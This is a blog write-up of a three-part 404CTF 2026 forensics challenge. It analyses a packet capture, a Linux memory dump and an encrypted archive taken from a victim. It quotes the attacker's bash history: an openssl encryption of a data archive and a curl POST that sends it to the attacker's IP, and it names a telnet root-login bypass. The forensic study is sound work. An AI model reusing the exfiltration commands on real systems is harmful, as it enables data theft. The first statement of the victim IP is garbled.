---
title: CTFs | 404CTF_2026 | Forensique | Exfiltration Kantik
author: BatBato
date: 2026-05-22
categories:
  - CTFs
  - 404_CTF_2026
  - Forensique
tags:
  - pcap
  - Forensique
  - Forensic
  - wireshark
permalink: /CTFs/404_CTF_2026/Forensique/Exfiltration_Kantik_1_3
---

![[Forensique_Exfiltration_Kantik_enonce.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/Forensique_Exfiltration_Kantik_enonce.png)

In this challenge, we are mandated to find a lot of information :
- IP attacker
- IP victim
- Apache server version
- CVE used by attacker
- Port of reverse shell

First on the wireshark capture, we see a bunch of `SYN` followed by `RST,ACK` which let us think of an nmap can. Then when we look at the TCP captures, we see the nmap NSE scripts doing some recon :

![[Forensique_Exfiltration_Kantik_nse.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/Forensique_Exfiltration_Kantik_nse.png)

So with this capture, we can guess that the Attacker IP is `192.168.122.133` and the victim IP is `133_192.168.122`. On this capture we also have the apache server version that is `2.4.66`.

If we continue to follow the TCP stream, we arrive at a TELNET connection :

![[Forensique_Exfiltration_Kantik_telnet.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/Forensique_Exfiltration_Kantik_telnet.png)

On this screenshot we clearly see the attacker being authenticated as the `root` user... Strange...
If we do a quick research on the `USER -f root` section, we arrive on this blog https://www.txone.com/blog/cve-2026-24061-gnu-inetutils-telnet-exploitation/ that explains how to get a `root` shell on a telnet server. This gives us the CVE version `CVE-2026-24061`. 

And we scroll down a bit, we arrive to the reverse shell section being put in `/opt/.system_update` :

![[Forensique_Exfiltration_Kantik_revShell.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/Forensique_Exfiltration_Kantik_revShell.png)

The port of the reverse shell is `4444`. So the final flag is  `404CTF{192.168.122.133_192.168.122.177_2.4.66_CVE-2026-24061_4444}`

![[exfil_kantik_2_enonce.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_2_enonce.png)

In this challenge we need to find information in a RAM dump about SQL data removed from the computer by the attacker. 

The first issue was to read the RAM file. If you ever have issues like :
```
Unsatisfied requirement plugins.PsList.kernel.layer_name:
Unsatisfied requirement plugins.PsList.kernel.symbol_table_name:
```

This is because we don't have the right RAM structure in volatility for this kind of dump. So to patch our volatility we just need to get the version of the linux machine :

```bash
vol.py -r pretty -f sample.bin banners

wget https://raw.githubusercontent.com/Abyss-W4tcher/volatility3-symbols/master/banners/banners_plain.json

grep -A 2 'Linux ....' banners_plain.json
```

Now that we have the correct banner, we can use the XXX github repository to get the right symbols and put them in our volatility folder :

```bash
wget https://github.com/Abyss-W4tcher/volatility3-symbols/raw/master/FOUND_IMAGE -P <volatility3_installation>/volatility3/symbols/linux/
```

As we can see, the mariadb process is running on port `674` :

![[exfil_kantik_2_pid.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_2_pid.png)

We can dump the process with the following command :

```bash
volatility3/vol.py -o dir -f memory_dump.lime linux.proc.Maps --pid 674 --dump
```

> Don't forget to create t output directory `dir`. This command will create a lot of output.
{: .prompt-warning}

As we can see, there are two files that are bigger than the others :

![[exfil_kantik_2_size.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_2_size.png)

If we `strings` them, we can find a `base64` string :

![[exfil_kantik_2_b64.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_2_b64.png)

And  if we decode it we get the flag :

![[exfil_kantik_2_flag.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_2_flag.png)

![[exfil_kantik_3_enonce.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_3_enonce.png)

For the last challenge we need to get information from the two previous part. In the first challenge we had extracted an `openssl` file that went to the attacker IP on `/upload` :

![[exfil_kantik_3_upload.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_3_upload.png)

If we check the bash history on the machine with the following command :

```bash
sudo python3 volatility3/vol.py -f memory_dump.lime linux.bash | tee bash
```

We can find how the document was encrypted and that the original file was a `.tar.gz` file :

```bash
1029	bash	2026-04-30 11:00:15.000000 UTC	curl -X POST -H 'Content-Type: application/octet-stream' --data-binary @/tmp/.encrypted_data.enc http://192.168.122.133:8080/upload 2>&1
1029	bash	2026-04-30 11:00:15.000000 UTC	openssl enc -aes-256-cbc -salt -in /tmp/.backup/data.tar.gz -out /tmp/.encrypted_data.enc -k $ENCRYPT_KEY
```

This confirm that we have the encrypted file. As we can see, we have the time of the upload `1777546354` :

![[exfil_kantik_3_timestamp.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_3_timestamp.png)

This means we need to find a timestamp before that time. To bruteforce this timestamp I used this code :

```python
import subprocess
import os
from datetime import datetime

base_timestamp = 1777546354 # 2026-04-30 11:00:15 UTC

for i in range(-100,0):
    timestamp = base_timestamp + i
    key = format(timestamp, 'x')

    output_file = f"dec/decrypted_{i}.tar.gz"
    cmd = [
        "openssl", "enc", "-aes-256-cbc", "-d",
        "-in", "encrypted_data.enc",
        "-out", output_file,
        "-k", key,
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        print(f"SUCCESS! Key: {key}")
        print(f"Decrypted file saved to: {output_file}")
        break
    else:
        os.remove(output_file)
```

Now we can unzip this file and get the secret content :

![[exfil_kantik_3_decrypt.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_3_decrypt.png)

In the PDF we can see an hex string :

![[exfil_kantik_3_begin_flag.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_3_begin_flag.png)

Decoded the strings gives us the beginning of the flag :

![[exfil_kantik_3_decode_flag.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_3_decode_flag.png)

The text lets us believe we need to extend the size of the page. To do this I used the  following code :

```python
import pdfplumber
from binascii import unhexlify
with pdfplumber.open("2026_04_18-Rapport_Confidentiel.pdf") as pdf:
    for page in pdf.pages:
        # Extraire le texte brut (même hors du cadre visible)
        text = page.extract_text()
        #print(text)

        # Extraire avec les positions apour identifier le texte hors cadre
        words = page.extract_words()
        for word in words:
            x0, x1 = word['x0'], word['x1']
            if "343034435" in word['text']:
                if x0 < 0 or x1 > page.width:
                    print(f"[HORS CADRE] '{word['text']}' à ({x0})")
                    print(f"Décodé: {unhexlify(word['text'].encode()).decode()}")
```

And... voilà...

![[exfil_kantik_3_flag.png]](https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/CTFs/404_CTF_2026/Forensique/Photos/exfil_kantik_3_flag.png)
